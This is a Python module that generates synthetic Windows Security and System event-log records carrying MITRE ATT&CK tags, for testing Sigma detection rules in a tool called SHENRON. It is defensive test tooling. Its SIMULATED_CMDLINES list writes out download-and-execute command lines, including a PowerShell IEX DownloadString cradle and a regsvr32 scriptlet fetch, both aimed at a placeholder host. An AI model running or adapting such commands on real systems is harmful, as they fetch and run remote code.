#!/usr/bin/env python3
"""
core/layers/windows_event_log_sim.py

SHENRON: Windows Event Log Simulator — synthetic Windows telemetry emitter.

PURPOSE: Emit Windows Event Log-shaped telemetry with real EventID, Channel,
and Provider_Name fields, enabling SHENRON to evaluate Windows-targeted
Sigma rules that the previous evaluator marked as UNSUPPORTED.

PRINCIPLE: Observable adversarial behavior, not portable adversarial procedure.

Windows Event IDs simulated:
  4624  — Successful logon
  4625  — Failed logon
  4648  — Logon with explicit credentials
  4688  — Process creation (with CommandLine)
  4697  — Service installed
  4698  — Scheduled task created
  4699  — Scheduled task deleted
  4702  — Scheduled task updated
  4720  — User account created
  4728  — Member added to security-enabled global group
  4732  — Member added to security-enabled local group
  7045  — New service installed
  1102  — Audit log cleared

MITRE coverage:
  T1053.005  — Scheduled Task/Job: Scheduled Task
  T1543.003  — Create or Modify System Process: Windows Service
  T1078      — Valid Accounts
  T1070.001  — Indicator Removal: Clear Windows Event Logs
  T1059.001  — PowerShell

Design constraints:
- New file only. Zero modifications to existing core files.
- No subprocess, no real Windows API calls, no registry writes.
- All fields carry simulation_only: true and full safety contract.
- EventID, Channel, Provider_Name mapped to pySigma bridge FIELD_MAP.
"""

import json
import uuid
import random
from datetime import datetime, timezone
from pathlib import Path
from core.engine.payload_registry import register_payload
from core.config import artifact_log_path as _artifact_log_path


def _get_artifact_log():
    p = _artifact_log_path()
    p.parent.mkdir(parents=True, exist_ok=True)
    return p


def _safe_fields() -> dict:
    return {
        "simulation_only": True,
        "executable": False,
        "payload_present": False,
        "portable_adversarial_procedure": False,
        "network_connection": False,
        "subprocess_spawned": False,
        "real_file_written": False,
        "shell_invoked": False,
    }


# ── Windows event catalog ─────────────────────────────────────────────────────

SIMULATED_PROCESSES = [
    "C:\\Windows\\System32\\powershell.exe",
    "C:\\Windows\\System32\\cmd.exe",
    "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Windows\\System32\\mshta.exe",
    "C:\\Windows\\System32\\wscript.exe",
    "C:\\Windows\\System32\\cscript.exe",
    "C:\\Windows\\System32\\regsvr32.exe",
    "C:\\Windows\\System32\\rundll32.exe",
    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe",
]

SIMULATED_TASK_NAMES = [
    "\\Microsoft\\Windows\\update_checker_sim",
    "\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update_sim",
    "\\scheduler_beacon_sim",
    "\\svchost_persist_sim",
    "\\Microsoft\\Windows\\maintenance_task_sim",
    "\\Microsoft\\Windows\\update_persist_sim",
    "\\WindowsUpdate_beacon_sim",
]

SIMULATED_SERVICE_NAMES = [
    "WindowsUpdateSvc_SIM",
    "NetworkMonitorSIM",
    "SecurityAuditSIM",
    "RemoteAccessSIM",
]

SIMULATED_USERS = [
    "DOMAIN_SIM\\Administrator",
    "DOMAIN_SIM\\svc_account",
    "DOMAIN_SIM\\user01",
    "NT AUTHORITY\\SYSTEM",
]

SIMULATED_COMPUTERS = [
    "WORKSTATION-042-SIM",
    "DC01-SIM",
    "FILESERVER01-SIM",
    "SQLSERVER-SIM",
]

SIMULATED_CMDLINES = [
    "powershell.exe -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7",
    "cmd.exe /c echo sim_payload > %TEMP%\\sim.bat && call %TEMP%\\sim.bat",
    "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\'http://sim.invalid/\')_SIM",
    "mshta.exe vbscript:Execute(\'sim_payload\')",
    "wscript.exe //B //NoLogo sim_script.js",
    "regsvr32.exe /s /n /u /i:http://sim.invalid/file.sct_SIM scrobj.dll",
]


def _base_event(event_id: int, channel: str, provider: str,
                computer: str, session_id: str) -> dict:
    """Build base Windows event structure with required fields."""
    return {
        "artifact_id":      str(uuid.uuid4()),
        "session_id":       session_id,
        "timestamp":        datetime.now(timezone.utc).isoformat(),
        "layer":            "windows_event_log_sim",
        "phase":            "SIMULATE",

        # Windows Event Log fields (pySigma bridge FIELD_MAP targets)
        "event_id_sim":     event_id,
        "windows_event_id": event_id,
        "EventID":          event_id,
        "Channel":          channel,
        "channel_sim":      channel,
        "Provider_Name":    provider,
        "provider_sim":     provider,
        "Computer":         computer,
        "computer_sim":     computer,

        # SHENRON schema fields
        "simulation_only":  True,
        "executable":       False,
        "payload_present":  False,
        "safety":           _safe_fields(),
        "generator":        "shenron/windows_event_log_sim v0.4.1",
        "note":             "SYNTHETIC RECORD — Windows Event Log shape simulation only",
    }


# ── Event generators ───────────────────────────────────────────────────────────

def _gen_4688(session_id: str, rng: random.Random) -> dict:
    """EventID 4688 — Process Creation."""
    computer  = rng.choice(SIMULATED_COMPUTERS)
    user      = rng.choice(SIMULATED_USERS)
    image     = rng.choice(SIMULATED_PROCESSES)
    cmdline   = rng.choice(SIMULATED_CMDLINES)
    parent    = rng.choice(SIMULATED_PROCESSES)
    pid       = rng.randint(1000, 65535)

    ev = _base_event(4688, "Security", "Microsoft-Windows-Security-Auditing",
                     computer, session_id)
    ev.update({
        "mitre_techniques":        ["T1059", "T1059.001"],
        "behavior_class":          "process_creation_sim",
        "detection_opportunities": ["process_create_non_system_parent",
                                    "commandline_encoded_b64",
                                    "interpreter_spawn_suspicious_parent"],
        "Image":          image,
        "exe_sim":        image,
        "CommandLine":    cmdline,
        "command_sim":    cmdline,
        "ParentImage":    parent,
        "parent_layer_sim": parent,
        "SubjectUserName": user.split("\\")[-1],
        "user_sim":        user,
        "ProcessId":       str(pid),
        "target_pid_sim":  str(pid),
        "description":     f"Process creation: {image.split(chr(92))[-1]} via {parent.split(chr(92))[-1]}",
    })
    return ev


def _gen_4698(session_id: str, rng: random.Random) -> dict:
    """EventID 4698 — Scheduled Task Created."""
    computer  = rng.choice(SIMULATED_COMPUTERS)
    user      = rng.choice(SIMULATED_USERS)
    task      = rng.choice(SIMULATED_TASK_NAMES)
    image     = rng.choice(SIMULATED_PROCESSES)

    ev = _base_event(4698, "Security", "Microsoft-Windows-Security-Auditing",
                     computer, session_id)
    ev.update({
        "mitre_techniques":        ["T1053", "T1053.005"],
        "behavior_class":          "scheduled_task_creation_sim",
        "detection_opportunities": ["scheduled_task_created_non_admin_tool",
                                    "task_action_references_temp_path",
                                    "scheduled_task_created_suspicious_user"],
        "TaskName":        task,
        "task_name_sim":   task,
        "SubjectUserName": user.split("\\")[-1],
        "user_sim":        user,
        "Image":           image,
        "exe_sim":         image,
        "description":     f"Scheduled task created: {task} by {user}",
    })
    return ev


def _gen_4697(session_id: str, rng: random.Random) -> dict:
    """EventID 4697 — Service Installed."""
    computer = rng.choice(SIMULATED_COMPUTERS)
    user     = rng.choice(SIMULATED_USERS)
    svc_name = rng.choice(SIMULATED_SERVICE_NAMES)
    svc_path = f"C:\\Windows\\Temp\\{svc_name}.exe"

    ev = _base_event(4697, "Security", "Microsoft-Windows-Security-Auditing",
                     computer, session_id)
    ev.update({
        "mitre_techniques":        ["T1543", "T1543.003"],
        "behavior_class":          "service_installed_sim",
        "detection_opportunities": ["service_created_non_installer",
                                    "service_binary_in_temp_path",
                                    "service_account_suspicious"],
        "ServiceName":     svc_name,
        "service_name_sim": svc_name,
        "ServiceFileName": svc_path,
        "service_path_sim": svc_path,
        "SubjectUserName": user.split("\\")[-1],
        "user_sim":        user,
        "description":     f"Service installed: {svc_name} -> {svc_path}",
    })
    return ev


def _gen_4625(session_id: str, rng: random.Random) -> dict:
    """EventID 4625 — Failed Logon."""
    computer = rng.choice(SIMULATED_COMPUTERS)
    user     = rng.choice(SIMULATED_USERS)
    fail_count = rng.randint(3, 50)

    ev = _base_event(4625, "Security", "Microsoft-Windows-Security-Auditing",
                     computer, session_id)
    ev.update({
        "mitre_techniques":        ["T1110", "T1110.001"],
        "behavior_class":          "failed_logon_burst_sim",
        "detection_opportunities": ["multiple_failed_logons_single_source",
                                    "brute_force_pattern_sim"],
        "SubjectUserName":  user.split("\\")[-1],
        "user_sim":         user,
        "SubjectDomainName": user.split("\\")[0] if "\\" in user else "SIM",
        "domain_sim":       "DOMAIN_SIM",
        "fail_count_sim":   fail_count,
        "description":      f"Failed logon: {user} ({fail_count} attempts simulated)",
    })
    return ev


def _gen_1102(session_id: str, rng: random.Random) -> dict:
    """EventID 1102 — Audit Log Cleared."""
    computer = rng.choice(SIMULATED_COMPUTERS)
    user     = rng.choice(SIMULATED_USERS)

    ev = _base_event(1102, "Security", "Microsoft-Windows-Eventlog",
                     computer, session_id)
    ev.update({
        "mitre_techniques":        ["T1070", "T1070.001"],
        "behavior_class":          "audit_log_cleared_sim",
        "detection_opportunities": ["security_event_log_cleared",
                                    "indicator_removal_windows_sim"],
        "SubjectUserName": user.split("\\")[-1],
        "user_sim":        user,
        "description":     f"Security audit log cleared by {user} on {computer}",
    })
    return ev


def _gen_7045(session_id: str, rng: random.Random) -> dict:
    """EventID 7045 — New Service Installed (System log)."""
    computer = rng.choice(SIMULATED_COMPUTERS)
    svc_name = rng.choice(SIMULATED_SERVICE_NAMES)
    svc_path = rng.choice(SIMULATED_PROCESSES)

    ev = _base_event(7045, "System", "Service Control Manager",
                     computer, session_id)
    ev.update({
        "mitre_techniques":        ["T1543", "T1543.003"],
        "behavior_class":          "new_service_system_log_sim",
        "detection_opportunities": ["new_service_installed_system_log",
                                    "service_binary_not_signed_sim"],
        "ServiceName":      svc_name,
        "service_name_sim": svc_name,
        "ServiceFileName":  svc_path,
        "service_path_sim": svc_path,
        "description":      f"New service installed (System): {svc_name} -> {svc_path}",
    })
    return ev


# ── Scenario runner ────────────────────────────────────────────────────────────

EVENT_GENERATORS = {
    4688: _gen_4688,
    4698: _gen_4698,
    4697: _gen_4697,
    4625: _gen_4625,
    1102: _gen_1102,
    7045: _gen_7045,
}

DEFAULT_SCENARIO = [4688, 4698, 4697, 4698, 4688, 4625, 1102, 7045]


def simulate_windows_events(
    scenario: list = None,
    seed: int = None,
    verbose: bool = True,
) -> tuple:
    """
    Simulate a Windows Event Log telemetry sequence.

    Args:
        scenario: List of EventIDs to generate (default: DEFAULT_SCENARIO)
        seed:     Random seed for reproducibility
        verbose:  Print simulation output

    Returns:
        (session_id, events)
    """
    if seed is not None:
        random.seed(seed)
    rng = random.Random(seed)

    session_id = str(uuid.uuid4())
    scenario   = scenario or DEFAULT_SCENARIO
    events     = []

    for event_id in scenario:
        gen = EVENT_GENERATORS.get(event_id)
        if gen is None:
            continue
        ev = gen(session_id, rng)
        events.append(ev)

        with open(_get_artifact_log(), "a") as f:
            f.write(json.dumps(ev) + "\n")

    if verbose:
        all_ids    = sorted({ev["EventID"] for ev in events})
        all_techs  = set()
        all_opps   = set()
        for ev in events:
            all_techs.update(ev.get("mitre_techniques", []))
            all_opps.update(ev.get("detection_opportunities", []))

        print(f"\n  [SIMULATION]  windows_event_log_sim")
        print(f"  [SESSION]     {session_id}")
        print(f"  [EVENTS]      {len(events)}")
        print(f"  [EVENT_IDS]   {all_ids}")
        print(f"  [MITRE]       {sorted(all_techs)}")
        print(f"  [DETECTIONS]  {len(all_opps)}")
        print(f"  [EXECUTABLE]  FALSE — shape simulation only")
        print(f"  [LOGGED]      {_get_artifact_log()}")
        print()
        for ev in events:
            print(f"  [EventID {ev['EventID']}] {ev.get('description', ev.get('behavior_class', ''))}")
        print()
        print(f"  [SAFE]  no Windows API calls, no registry writes, no process creation")

    return session_id, events


def write_windows_artifact(
    output_path: str,
    scenario: list = None,
    seed: int = 42,
    verbose: bool = True,
) -> dict:
    """Generate Windows event telemetry and write to JSONL artifact."""
    session_id, events = simulate_windows_events(
        scenario=scenario, seed=seed, verbose=verbose
    )
    out = Path(output_path)
    out.parent.mkdir(parents=True, exist_ok=True)
    with open(out, "w", encoding="utf-8") as f:
        for ev in events:
            f.write(json.dumps(ev) + "\n")
    return {
        "session_id": session_id,
        "events_written": len(events),
        "output_path": str(out),
        "event_ids": sorted({ev["EventID"] for ev in events}),
    }


@register_payload(name="windows_event_log_sim")
def main():
    simulate_windows_events(seed=42)


if __name__ == "__main__":
    main()
